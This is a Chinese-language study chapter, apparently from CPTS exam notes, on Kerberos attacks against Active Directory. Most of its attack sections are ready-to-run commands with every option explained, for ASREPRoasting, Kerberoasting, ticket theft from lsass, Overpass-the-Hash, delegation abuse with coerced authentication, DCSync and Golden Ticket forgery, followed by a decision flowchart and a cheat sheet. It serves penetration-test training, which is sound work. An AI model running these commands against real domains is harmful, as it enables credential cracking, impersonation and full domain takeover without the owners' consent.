# 第 75 章 - Kerberos 攻擊

## 標籤

- #cpts
- #chapter
- #active-directory
- #kerberos

## 學習目標

- 理解每種 Kerberos 攻擊的前提條件，知道什麼情況下才能用。
- 掌握每個指令的每個選項是什麼意思。
- 知道 WSL2 時鐘偏移問題的成因與修法。
- 能依照現有的條件（帳號、hash、ticket）判斷走哪條路。

---

## 理論基礎：Kerberos 認證流程

理解攻擊前，先知道正常流程：

```
用戶端                      KDC（DC）                   服務主機
   │                           │                           │
   │── AS-REQ（我是誰，要 TGT）→│                           │
   │   （帶時間戳 + 密碼 hash）  │                           │
   │←── AS-REP（給你 TGT）──────│                           │
   │                           │                           │
   │── TGS-REQ（我有 TGT，要存取某服務）→│                  │
   │←── TGS-REP（給你 TGS，用服務帳號密碼加密）──────────── │
   │                           │                           │
   │─────────────────────────────── 送 TGS 給服務主機 ─────→│
   │                           │                           │
```

**每種攻擊針對流程的哪個環節：**

| 攻擊 | 針對環節 | 需要什麼 | 得到什麼 |
|------|---------|---------|---------|
| ASREPRoasting | AS-REP（不需要預驗證） | 帳號名稱（不需要密碼） | 帳號密碼 hash → 離線破解 |
| Kerberoasting | TGS-REP | 任意有效 domain 帳號 | 服務帳號密碼 hash → 離線破解 |
| Pass-the-Ticket | 直接用 ticket | 取得 TGT 或 TGS | 繞過密碼，直接存取服務 |
| Overpass-the-Hash | AS-REQ | NTLM hash | 換成 TGT |
| Unconstrained Delegation | 快取 TGT | 控制 UCD 主機 | 抓到高權帳號的 TGT |
| Constrained Delegation | S4U2Proxy | 控制委派帳號 | 偽造其他人的 TGS |
| Golden Ticket | 偽造 TGT | krbtgt hash + domain SID | 偽造任意帳號的 TGT，無限期有效 |

---

## WSL2 時鐘修正（必做）

### 為什麼需要

Kerberos 要求客戶端與 KDC 的時間差 < 5 分鐘，否則所有 Kerberos 操作都會失敗，報錯 `KRB_AP_ERR_SKEW`。

WSL2 的系統時鐘由 Windows 主機控制，但有時會偏移。`sudo date -s` 可以改，但很快又被 Windows 覆蓋回去。

### 解法：faketime 包住指令

```bash
# Step 1：從 DC 取得目前時間
CT=$(proxychains4 -f $PC ldapsearch \
  -x \
  -H ldap://$DC \
  -D "$USER@$DOMAIN" \
  -w "$PASS" \
  -b '' \
  -s base \
  currentTime 2>/dev/null | grep '^currentTime:' | awk '{print $2}')
# ldapsearch 選項說明：
# -x         → 簡單認證（不用 GSSAPI/Kerberos），適合密碼登入
# -H ldap:// → 指定 LDAP server 的 URI
# -D         → 以哪個帳號登入（Distinguished Name 或 UPN 格式）
# -w         → 密碼
# -b ''      → 搜尋基礎（空字串 = root DSE，DC 的最頂層）
# -s base    → 只查 base 物件本身（不往下找），DC 的根節點就有 currentTime

# Step 2：把 LDAP 格式時間轉換成 faketime 看得懂的格式
DC_TIME="${CT:0:4}-${CT:4:2}-${CT:6:2} ${CT:8:2}:${CT:10:2}:${CT:12:2}"
# LDAP 的 currentTime 格式：20240815143022.0Z
# 切法：年(4) 月(2) 日(2) 時(2) 分(2) 秒(2) → "2024-08-15 14:30:22"

# Step 3：用 faketime 包住 Kerberos 指令
TZ=UTC faketime "$DC_TIME" <你的 Kerberos 指令>
# TZ=UTC        → 強制設定時區為 UTC，避免時區轉換錯誤
# faketime      → 讓程式以為現在是指定的時間，不影響系統時鐘
# "$DC_TIME"    → 剛才算出來的 DC 時間
```

**設環境變數方便重用：**

```bash
# 先設好這些，後面的指令直接用變數
export DC=172.16.139.3
export DOMAIN=AD.TRILOCOR.LOCAL
export USER=jdoe
export PASS='Password123!'
export PC=/etc/proxychains4.conf
export PYTHON=/home/wayne/.local/share/pipx/venvs/impacket/bin/python3
```

---

## ASREPRoasting

### 原理

正常情況下，AS-REQ 要帶時間戳（用帳號密碼加密），讓 KDC 驗證「這個請求真的是你發的」，這叫「Kerberos 預驗證」。

如果某個帳號關閉了預驗證（`UF_DONT_REQUIRE_PREAUTH`），任何人只要知道帳號名稱，就能送一個 AS-REQ 給 DC，DC 會直接回 AS-REP，而 AS-REP 的一部分是用該帳號的密碼 hash 加密的。拿到這段密文就能離線暴力破解。

### 何時用

- 你拿到一份帳號列表，或是有任意 domain 帳號可以查
- 想找沒有密碼保護的弱點帳號

### 方法一：有帳號列表，無憑證

```bash
proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/GetNPUsers.py \
  "$DOMAIN/" \
  -dc-ip $DC \
  -usersfile /tmp/users.txt \
  -no-pass \
  -outputfile /tmp/asrep_hashes.txt

# GetNPUsers.py 選項說明：
# "$DOMAIN/"       → 只指定 domain，不加帳號（因為沒有憑證）
# -dc-ip $DC       → DC 的 IP
# -usersfile       → 帳號列表，一行一個帳號名
# -no-pass         → 不用密碼（正是 AS-REP 攻擊的核心：不需要密碼）
# -outputfile      → 把抓到的 hash 存到檔案
```

### 方法二：有任意 domain 帳號（自動找可攻擊帳號）

```bash
proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/GetNPUsers.py \
  "$DOMAIN/$USER:$PASS" \
  -dc-ip $DC \
  -request \
  -outputfile /tmp/asrep_hashes.txt

# "$DOMAIN/$USER:$PASS"  → 用有效帳號登入，讓工具能查 LDAP 找出所有 DONT_REQUIRE_PREAUTH 帳號
# -request               → 對每個找到的帳號都發 AS-REQ 取 hash
```

### 方法三：nxc（最快確認）

```bash
proxychains4 -f $PC nxc ldap $DC -u $USER -p $PASS --asreproast /tmp/asrep.txt
# --asreproast    → 自動找出可攻擊帳號並取 hash
```

### 破解

```bash
hashcat -m 18200 /tmp/asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
# -m 18200  → Kerberos 5 AS-REP etype 23 的 hash 格式
# --force   → 忽略 GPU 相容性警告（在 VM 裡跑時需要）
```

---

## Kerberoasting

### 原理

有 SPN（Service Principal Name）的帳號，代表它是某個服務的身份（例如 MSSQLSvc/server.domain.local）。任何有效的 domain 帳號都可以請求該服務的 TGS，而 TGS 是用服務帳號的密碼 hash 加密的。拿到 TGS 就能離線暴力破解出服務帳號的密碼。

### 何時用

- 你有任何一個 domain 帳號（哪怕是最低權限的）
- 想找服務帳號的密碼（服務帳號通常有特殊權限）

### 枚舉 + 取 hash

```bash
# 方法一：nxc（快速確認）
proxychains4 -f $PC nxc ldap $DC -u $USER -p $PASS --kerberoasting /tmp/kerb.txt
# --kerberoasting → 自動找所有有 SPN 的帳號，取 TGS hash

# 方法二：GetUserSPNs.py（含時鐘修正）
TZ=UTC faketime "$DC_TIME" proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/GetUserSPNs.py \
  "$DOMAIN/$USER:$PASS" \
  -dc-ip $DC \
  -request \
  -outputfile /tmp/kerb_hashes.txt

# GetUserSPNs.py 選項說明：
# "$DOMAIN/$USER:$PASS"  → 用有效帳號登入 DC
# -dc-ip $DC             → DC 的 IP
# -request               → 對每個有 SPN 的帳號都請求 TGS（取 hash）
#                          如果不加，只列出帳號和 SPN，不取 hash
# -outputfile            → 把 hash 存到檔案
# 為什麼要 faketime？     → Kerberos TGS 請求也帶時間戳，時鐘偏差會失敗

# 只列出 SPN 帳號（不取 hash，先看有哪些）
TZ=UTC faketime "$DC_TIME" proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/GetUserSPNs.py \
  "$DOMAIN/$USER:$PASS" -dc-ip $DC
```

### 破解

```bash
hashcat -m 13100 /tmp/kerb_hashes.txt /usr/share/wordlists/rockyou.txt --force
# -m 13100  → Kerberos 5 TGS-REP etype 23 的 hash 格式（RC4-HMAC）

# 加規則（提升成功率）
hashcat -m 13100 /tmp/kerb_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force
# -r  → 應用規則集，對每個密碼做大小寫變換、加數字、加符號等

# john（備用）
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/kerb_hashes.txt
```

### 破解後驗證

```bash
proxychains4 -f $PC nxc smb $DC -u CRACKED_USER -p 'CRACKED_PASS' -d $DOMAIN
proxychains4 -f $PC nxc winrm TARGET -u CRACKED_USER -p 'CRACKED_PASS' -d $DOMAIN
```

---

## Targeted Kerberoasting（GenericWrite 濫用）

### 原理

如果你對某個帳號有 `GenericWrite` 權限，你可以修改那個帳號的屬性，包括幫它設 SPN。有了 SPN，那個帳號就變成可被 Kerberoast 的目標。取完 hash 後再把 SPN 刪掉，還原成原來的狀態。

### 何時用

- BloodHound 顯示你的帳號對某目標帳號有 `GenericWrite`
- 那個帳號的密碼可能比較弱，值得嘗試

```bash
proxychains4 -f $PC python3 targetedKerberoast.py \
  -u $USER \
  -p "$PASS" \
  -d $DOMAIN \
  --dc-ip $DC \
  -o /tmp/targeted.hash

# targetedKerberoast.py 選項說明：
# -u / -p / -d   → 你當前帳號的憑證和 domain
# --dc-ip        → DC 的 IP
# -o             → 輸出 hash 的檔案
# （工具會自動找所有你有 GenericWrite 的帳號，設 SPN → 取 hash → 刪 SPN）

hashcat -m 13100 /tmp/targeted.hash /usr/share/wordlists/rockyou.txt --force
```

---

## Pass-the-Ticket（PtT）

### 原理

拿到 TGT 或 TGS 後直接使用，不需要密碼。Kerberos ticket 本身就是「已驗證的憑證」，有了 ticket 就像有了密碼一樣能存取服務。

### 何時用

- 你從記憶體、lsass dump、或 Delegation 攻擊取得了 ticket
- 不知道明文密碼，但有 ticket 材料

### 取得 ticket

```bash
# 方法一：從 lsass dump 提取（pypykatz）
pypykatz lsa minidump lsass.dmp | grep -A5 "kerberos"
# 找 .kirbi 格式的 ticket，或直接用 ccache

# 方法二：mimikatz（Windows 上）
privilege::debug     # 取得 debug 權限
sekurlsa::tickets /export   # 匯出所有 ticket 到 .kirbi 檔案

# 方法三：Rubeus（Windows 上）
.\Rubeus.exe dump /nowrap    # 列出所有 ticket（base64 格式）
.\Rubeus.exe tgtdeleg /nowrap  # 取得可用的 TGT（降格攻擊）
```

### 使用 ticket（Linux）

```bash
# .kirbi 轉 .ccache（如果需要）
python3 /path/to/ticketConverter.py ticket.kirbi ticket.ccache

# 設定 ticket 環境變數
export KRB5CCNAME=/tmp/ticket.ccache
# KRB5CCNAME 是 Linux Kerberos 的環境變數，告訴工具去哪裡找 ticket

# 用 ticket 存取服務（不需要密碼）
proxychains4 -f $PC $PYTHON /path/to/psexec.py \
  -k \
  -no-pass \
  $DOMAIN/Administrator@TARGET_IP
# -k        → 使用 Kerberos 認證（用 KRB5CCNAME 指向的 ticket）
# -no-pass  → 不提示密碼
# 搭配其他工具（wmiexec、smbexec 等）同樣方式
```

---

## Overpass-the-Hash（NTLM → TGT）

### 原理

你有某帳號的 NTLM hash，但目標環境封鎖了 NTLM 認證（只允許 Kerberos）。Overpass-the-Hash 利用 NTLM hash 向 KDC 請求 TGT，把 hash 換成 Kerberos ticket 使用。

### 何時用

- 你用 PTH 打不進去（NTLM 被封）
- 有 NTLM hash 但環境要求 Kerberos 認證

```bash
TZ=UTC faketime "$DC_TIME" proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/getTGT.py \
  "$DOMAIN/Administrator" \
  -hashes :NTLM_HASH \
  -dc-ip $DC

# getTGT.py 選項說明：
# "$DOMAIN/Administrator"  → 要換 TGT 的帳號
# -hashes :NTLM_HASH       → 格式是 LM:NTLM，LM 不知道就用空的（留 :）
# -dc-ip                   → DC 的 IP
# 執行後會產生 Administrator.ccache

export KRB5CCNAME=Administrator.ccache
proxychains4 -f $PC $PYTHON /path/to/secretsdump.py \
  -k -no-pass $DOMAIN/Administrator@$DC
```

---

## Unconstrained Delegation 濫用

### 原理

設定了 Unconstrained Delegation 的主機（通常是某些伺服器），當有人存取它時，那個人的 TGT 會被快取在那台機器的記憶體中。如果你控制了這台機器，你可以從記憶體中拿出任何存取過它的帳號的 TGT，包括 DA 或 DC 的 TGT。

### 何時用

- BloodHound 或 ldap 顯示某台機器有 `TRUSTED_FOR_DELEGATION`
- 你已控制那台機器（或能在上面執行指令）

```bash
# 找有 Unconstrained Delegation 的主機
proxychains4 -f $PC nxc ldap $DC -u $USER -p $PASS \
  --trusted-for-delegation 2>/dev/null
# --trusted-for-delegation → 列出 userAccountControl 中有 TRUSTED_FOR_DELEGATION 的物件

# PowerView（Windows 上）
Get-DomainComputer -Unconstrained | Select DNSHostName,UserAccountControl

# 在有 UCD 的主機上監控新 TGT
.\Rubeus.exe monitor /interval:5 /nowrap
# /interval:5  → 每 5 秒檢查一次新的 ticket
# /nowrap      → 不換行（方便複製 base64）

# 強制 DC 連進來（SpoolSample / PrinterBug）
.\SpoolSample.exe DC_IP UCD_HOST_IP
# 讓 DC 主動連到 UCD 主機 → DC 的 TGT 被快取 → Rubeus 抓到
# 或用 PetitPotam
python3 PetitPotam.py -u $USER -p $PASS UCD_HOST_IP DC_IP
```

---

## Constrained Delegation 濫用（S4U2Proxy）

### 原理

Constrained Delegation 允許某個帳號「代表任意使用者」去存取特定服務（例如 cifs/DC01）。利用 S4U2Self + S4U2Proxy 兩個 Kerberos 擴充，你能偽造一個「Administrator 想存取 cifs/DC01」的 TGS，然後用這個偽造的 TGS 存取 DC。

### 何時用

- BloodHound 或 ldap 顯示某帳號有 `msds-allowedtodelegateto`
- 你知道那個帳號的密碼或 hash

```bash
# 找有 Constrained Delegation 的帳號
proxychains4 -f $PC ldapsearch -x -H ldap://$DC \
  -D "$USER@$DOMAIN" -w "$PASS" \
  -b "DC=ad,DC=trilocor,DC=local" \
  "(msds-allowedtodelegateto=*)" msds-allowedtodelegateto sAMAccountName 2>/dev/null
# (msds-allowedtodelegateto=*) → 搜尋有設定委派目標的帳號
# 最後兩個是要顯示的屬性：委派目標 和 帳號名稱

# 利用（getST = get Service Ticket）
TZ=UTC faketime "$DC_TIME" proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/getST.py \
  "$DOMAIN/DELEGATED_USER:PASSWORD" \
  -spn cifs/DC.ad.trilocor.local \
  -impersonate Administrator \
  -dc-ip $DC

# getST.py 選項說明：
# "$DOMAIN/DELEGATED_USER:PASSWORD"  → 有委派設定的帳號和密碼
# -spn cifs/DC.ad.trilocor.local     → 要偽造存取的服務（SPN），從 msds-allowedtodelegateto 查到的
# -impersonate Administrator          → 要代表哪個帳號存取（我們想偽裝成 Administrator）
# -dc-ip                             → DC 的 IP
# 執行後產生 Administrator@cifs_DC.ccache

export KRB5CCNAME=Administrator@cifs_DC.ccache
proxychains4 -f $PC $PYTHON /path/to/secretsdump.py \
  -k -no-pass $DOMAIN/Administrator@$DC
```

---

## Golden Ticket

### 原理

krbtgt 帳號是 Kerberos 的核心，所有 TGT 都由它簽署。有了 krbtgt 的 NTLM hash 和 Domain SID，你可以自己製造任意帳號的 TGT，KDC 無法分辨真假（因為簽名是有效的）。

### 何時用

- 你已經 DCSync 取得 krbtgt hash
- 需要長期持久化（即使帳號密碼改了，Golden Ticket 仍有效，直到 krbtgt 密碼被改兩次）

```bash
# Step 1：DCSync 取 krbtgt hash
TZ=UTC faketime "$DC_TIME" proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/secretsdump.py \
  "$DOMAIN/Administrator:PASSWORD@$DC" \
  -just-dc-user krbtgt
# -just-dc-user krbtgt → 只 dump krbtgt 帳號（快，不需要 dump 所有帳號）
# 結果中找 krbtgt:502:aad3b... → 後面那串是 NTLM hash

# Step 2：取 Domain SID
proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/getPac.py \
  -targetUser Administrator "$DOMAIN/Administrator:PASSWORD" \
  -dc-ip $DC
# 或從 secretsdump 輸出中看 domain SID

# Step 3：產生 Golden Ticket
proxychains4 -f $PC $PYTHON \
  /home/wayne/.local/share/pipx/venvs/impacket/bin/ticketer.py \
  -nthash KRBTGT_NTLM \
  -domain-sid DOMAIN_SID \
  -domain $DOMAIN \
  Administrator

# ticketer.py 選項說明：
# -nthash KRBTGT_NTLM  → krbtgt 帳號的 NTLM hash
# -domain-sid          → Domain 的 SID（格式：S-1-5-21-...）
# -domain              → Domain FQDN
# Administrator        → 偽造哪個帳號的 TGT

export KRB5CCNAME=Administrator.ccache
proxychains4 -f $PC $PYTHON /path/to/secretsdump.py \
  -k -no-pass $DOMAIN/Administrator@$DC
```

---

## 實戰決策流程

```text
進入 AD 環境，有任意帳號？
│
├── 先試 ASREPRoasting（無需高權限，可能直接得帳號）
│   GetNPUsers.py → hashcat -m 18200
│
├── 再試 Kerberoasting（有 domain 帳號就能做）
│   GetUserSPNs.py -request → hashcat -m 13100
│
├── BloodHound 找 ACL 鏈？→ 看 77-ADACL濫用
│   有 GenericWrite？→ Targeted Kerberoasting
│
├── 有 NTLM hash？
│   ├── NTLM 沒被封 → PTH（Pass-the-Hash）
│   └── NTLM 被封 → Overpass-the-Hash → getTGT.py
│
├── 有 Ticket 材料（TGT/TGS）？
│   → PtT（KRB5CCNAME + -k -no-pass）
│
├── BloodHound 發現 Delegation？
│   ├── Unconstrained → 控制主機後等/強制 DA 連入
│   └── Constrained → getST.py -impersonate Administrator
│
└── 已是 DA / 有 krbtgt hash？
    → Golden Ticket（持久化）
```

---

## 速查表

```bash
# === 環境變數（先設好）===
export DC=172.16.139.3
export DOMAIN=AD.TRILOCOR.LOCAL
export USER=jdoe; export PASS='Password!'
export PC=/etc/proxychains4.conf
export PYTHON=/home/wayne/.local/share/pipx/venvs/impacket/bin/python3

# === WSL2 時鐘修正 ===
CT=$(proxychains4 -f $PC ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" \
  -w "$PASS" -b '' -s base currentTime 2>/dev/null | grep '^currentTime:' | awk '{print $2}')
DC_TIME="${CT:0:4}-${CT:4:2}-${CT:6:2} ${CT:8:2}:${CT:10:2}:${CT:12:2}"

# === ASREPRoasting ===
proxychains4 -f $PC $PYTHON GetNPUsers.py "$DOMAIN/$USER:$PASS" \
  -dc-ip $DC -request -outputfile /tmp/asrep.txt
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt --force

# === Kerberoasting ===
TZ=UTC faketime "$DC_TIME" proxychains4 -f $PC $PYTHON GetUserSPNs.py \
  "$DOMAIN/$USER:$PASS" -dc-ip $DC -request -outputfile /tmp/kerb.txt
hashcat -m 13100 /tmp/kerb.txt /usr/share/wordlists/rockyou.txt --force

# === Targeted Kerberoast（GenericWrite）===
proxychains4 -f $PC python3 targetedKerberoast.py \
  -u $USER -p "$PASS" -d $DOMAIN --dc-ip $DC -o /tmp/targeted.hash

# === Constrained Delegation ===
TZ=UTC faketime "$DC_TIME" proxychains4 -f $PC $PYTHON getST.py \
  "$DOMAIN/DELEGATED_USER:PASS" -spn cifs/DC.$DOMAIN \
  -impersonate Administrator -dc-ip $DC
export KRB5CCNAME=Administrator@cifs_DC.ccache
```

## 關聯筆記

- [[62-Kerberos認證資料攻擊|第 62 章 - Kerberos 認證資料攻擊]]
- [[71-AD驗證|第 71 章 - AD 驗證]]
- [[73-有憑證AD列舉|第 73 章 - 有憑證 AD 列舉]]
- [[77-ADACL濫用|第 77 章 - AD ACL 濫用]]
- [[09-Volume-9-Active-Directory-Index|Vol.9 - Active Directory Enumeration and Attacks]]
